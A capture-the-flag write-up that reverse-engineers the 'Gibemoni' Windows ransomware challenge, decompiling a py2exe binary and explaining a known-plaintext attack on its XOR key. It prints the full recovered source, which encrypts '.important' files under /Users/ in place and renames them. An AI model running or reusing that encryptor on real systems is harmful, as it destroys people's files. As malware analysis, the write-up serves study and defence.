---
layout: post
author: eyJhb
title:  "Hack IT 2018 - Challenge 2 - Gibemoni"
date:   2018-11-17 18:00:00 +0000
categories: ctf hackit2018
---
In a previous post found ([Hack IT 2018 - Challenge 2 - Crymore]({% post_url 2018-11-17-hackit-2018-challenge-2-linux %})), 
I explained how break the Crymore ransomware. 
This post will instead focus on its Windows version valled `Givemoni`, which uses a completely
different tactic of encrypting the users data.

The challenge contained the following two files:

- gibemoni.exe (binary file used to encrypt files)
- flag.pdf.important.GibeMoni (our encrypted flag - a pdf file)

First thing I always do when I get a binary, is to just run strings on it, `strings gibemoni.exe`.
Doing this, reveals a lot of strings containing the keyword `.pycPK`, which quickly
lead me to believe that this was some Python code converted to a `.exe` file.
Running a quick `strings gibemoni.exe | grep -i python` reveals many strings, containing the keyword Python.

```
,C:\Python34\lib\encodings\iso2022_jp_2004.pyr
)C:\Python34\lib\encodings\iso2022_jp_3.pyr
 C:\Python34\lib\sre_constants.pyr
C:\Python34\lib\http\client.py
"C:\Python34\lib\encodings\cp855.py
C:\Python34\lib\socket.py
+C:\Python34\lib\encodings\iso2022_jp_ext.pyr
C:\Users\martin\34\python\PCbuild\_lzma.pdb
```

From this we now know, that we are dealing with Python code converted to a `.exe file`,
and it was properly done using `py2exe`, which is the most popular tool for this task.
Besides this it can also be noted, that the version used for this is Python 3.4.

Now we need to extract the sourcecode for Gibemoni, which can be done using `unpy2exe` and `uncompyle6`
which both can be found in the official pip repository.

I ended up creating a Dockerfile, so that I could specify the version of Python I wanted to use.
I experienced that I needed Python version 3.4 for `unpy2exe` to work correctly, and then switch to 
Python 3.7 after to run `uncompyle6`.

`Dockerfile`
```
FROM python:3.4-alpine3.7

RUN pip install uncompyle6 unpy2exe
```

Running this, allows us to first extract the `.pyc` file, and then decompile that to readable Python code.

```
# build docker image from Dockerfile
docker build -t gib .
# run our docker image, with the currect directory mounted at /src
docker run --rm -it $(pwd):/src gib sh
cd /src
unpy2exe gibemoni.exe
# remember to change FROM in the Dockerfile to `FROM python:3.7-alpine3.7` and rebuild
uncompyle6 ransom.py.pyc > ransom.py
```

This should result in the following code 

`ransom.py`
```
# uncompyle6 version 3.2.4
# Python bytecode 3.4 (3310)
# Decompiled from: Python 3.7.1 (default, Nov 16 2018, 06:33:02) 
# [GCC 6.4.0]
# Embedded file name: ransom.py
# Compiled at: 2018-11-21 21:37:34
# Size of source mod 2**32: 212 bytes
import os

def find_important_files(startpath):
    for dirpath, dirs, files in os.walk(startpath):
        for f in files:
            abspath = os.path.abspath(os.path.join(dirpath, f))
            if abspath.split('.')[-1] == 'important':
                yield abspath
                continue


def encrypt_file(filename, key):
    i = 0
    with open(filename, 'r+b') as (f):
        plaintext = f.read(1)
        while plaintext:
            ciphertext = ord(plaintext) ^ key[i % 32]
            f.seek(-1, 1)
            f.write(bytes([ciphertext]))
            plaintext = f.read(1)
            i += 1


if __name__ == '__main__':
    print('Starting up...')
    print('HueHueHueHueHueHueHueHue')
    key = os.urandom(32)
    for f in find_important_files('/Users/'):
        encrypt_file(f, key)
        if os.path.exists(f + '.GibeMoni'):
            os.remove(f + '.GibeMoni')
        os.rename(f, f + '.GibeMoni')
        print('Encrypted: ' + f)
```

Keep in mind, I have cut off the last part which printed out the banner.
But now we can see what happens, when the ransomware encrypts the files.

On first glance in the `__main__`, we see that is generates a random 32 byte key,
that is uses for encryption.
Looking at the `encrypt_file` function, we can see that it accepts a `filename` and a `key`.
The key is basically used to XOR the plaintext with.
This means that we need to find some what, of recreating the key, that was used to encrypt our flag.

As we know that the flag was a `.pdf` file, we know the first 5 bytes of the file, that all pdfs starts with `%PDF-1.`.
This means that we can find the first 5 bytes of the key, which will then allow us to find other patterns in the pdf,
as it reuses the key throughout the file.
This in turns, allows us to guess patterns until we have the full key used to XOR our flag.


